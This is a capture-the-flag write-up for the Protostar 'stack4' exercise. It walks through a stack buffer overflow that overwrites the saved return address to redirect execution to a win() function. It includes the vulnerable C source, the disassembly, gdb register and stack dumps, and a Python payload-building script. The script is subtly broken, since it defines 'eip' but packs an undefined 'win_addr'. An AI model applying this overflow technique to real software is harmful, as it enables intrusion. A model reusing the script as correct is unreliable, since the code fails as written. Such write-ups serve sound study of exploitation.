## STACK FOUR ##
Stack4 takes a look at overwriting saved EIP and standard buffer overflows.

This level is at /opt/protostar/bin/stack4

Hints

A variety of introductory papers into buffer overflows may help.
gdb lets you do “run < input”
EIP is not directly after the end of buffer, compiler padding can also increase the size.
### Source Code ###
```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```
After disassemble the code, the variables can be interpreted as below
```
0x08048408 <main+0>:    push   %ebp
0x08048409 <main+1>:    mov    %esp,%ebp
0x0804840b <main+3>:    and    $0xfffffff0,%esp
0x0804840e <main+6>:    sub    $0x50,%esp
0x08048411 <main+9>:    lea    0x10(%esp),%eax
0x08048415 <main+13>:   mov    %eax,(%esp)
0x08048418 <main+16>:   call   0x804830c <gets@plt>
0x0804841d <main+21>:   leave  
0x0804841e <main+22>:   ret  
```

The address of win() function can be found by objdump
```
objdump -t stack4 | grep win
080483f4 g     F .text  00000014              win
```
We need to overflow the buffer and insert this address

The following lines show registers and stacks before gets
```
eax            0xbffff760       -1073744032
ecx            0x605594b5       1616221365
edx            0x1      1
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff750       0xbffff750
ebp            0xbffff7a8       0xbffff7a8
esi            0x0      0
edi            0x0      0
eip            0x8048418        0x8048418 <main+16>
eflags         0x200286 [ PF SF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
0xbffff750:     0xbffff760      0xb7ec6165      0xbffff768      0xb7eada75
0xbffff760:     0xb7fd7ff4      0x080495ec      0xbffff778      0x080482e8
0xbffff770:     0xb7ff1040      0x080495ec      0xbffff7a8      0x08048449
0xbffff780:     0xb7fd8304      0xb7fd7ff4      0x08048430      0xbffff7a8
0xbffff790:     0xb7ec6365      0xb7ff1040      0x0804843b      0xb7fd7ff4
0xbffff7a0:     0x08048430      0x00000000      0xbffff828      0xb7eadc76
0x8048418 <main+16>:    call   0x804830c <gets@plt>
0x804841d <main+21>:    leave

```

Therefore, we need to prepare a script *input.py* to easily insert the non-ascii character
from the win() function address.

```python
import struct
buffer = "AAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDD"
padding = "EEEEFFFF"
ebp = "GGGG"
eip = 0x080483f4   # win function address 
send_data = buffer + padding + ebp + struct.pack('I', win_addr)
print(send_data)
```

Run the script and redirect it to a file
```bash 
python input.py > input.txt
```

Let's run again

```
gdb stack4 
r < input.txt
```
And the stack after
```
eax            0xbffff760       -1073744032
ecx            0xbffff760       -1073744032
edx            0xb7fd9334       -1208118476
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff750       0xbffff750
ebp            0xbffff7a8       0xbffff7a8
esi            0x0      0
edi            0x0      0
eip            0x804841d        0x804841d <main+21>
eflags         0x200246 [ PF ZF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
0xbffff750:     0xbffff760      0xb7ec6165      0xbffff768      0xb7eada75
0xbffff760:     0x41414141      0x41414141      0x41414141      0x41414141 -
0xbffff770:     0x42424242      0x42424242      0x42424242      0x42424242  |  
0xbffff780:     0x43434343      0x43434343      0x43434343      0x43434343  |-> buffer
0xbffff790:     0x44444444      0x44444444      0x44444444      0x44444444  |
0xbffff7a0:     0x45454545      0x46464646      0x47474747      0x080483f4 -
                    ^               ^               ^               ^
                    |               |               |               |
                    padding         padding         ebp             eip
                    
0x804841d <main+21>:    leave
0x804841e <main+22>:    ret
```

and the result
```
code flow successfully changed

```











